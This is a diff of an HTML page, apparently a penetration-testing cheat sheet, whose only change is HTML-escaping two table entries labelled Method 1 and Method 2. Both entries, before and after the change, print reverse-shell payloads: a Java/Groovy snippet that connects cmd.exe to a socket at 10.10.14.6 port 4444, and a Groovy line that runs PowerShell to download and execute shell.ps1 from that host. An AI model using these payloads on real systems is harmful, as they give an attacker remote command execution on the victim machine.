@@ -1086,21 +1086,13 @@ layout: default
 			<tr>
 				<td>Method 1</td>
 				<td>
-					<pre>
-String host="10.10.14.6";
-int port=4444;
-String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-					</pre>
+					<pre>&#13;&#10;String host=&quot;10.10.14.6&quot;;&#13;&#10;int port=4444;&#13;&#10;String cmd=&quot;cmd.exe&quot;;&#13;&#10;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();&#13;&#10;&#9;&#9;&#9;&#9;&#9;</pre>
 				</td>
 			</tr>
 			<tr>
 				<td>Method 2</td>
 				<td>
-					<pre>
-cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/shell.ps1')" """
-println cmd.execute().text
-					</pre>
+					<pre>&#13;&#10;cmd = &quot;&quot;&quot; powershell &quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://10.10.14.6/shell.ps1&apos;)&quot; &quot;&quot;&quot;&#13;&#10;println cmd.execute().text&#13;&#10;&#9;&#9;&#9;&#9;&#9;</pre>
 				</td>
 			</tr>
 		</table>
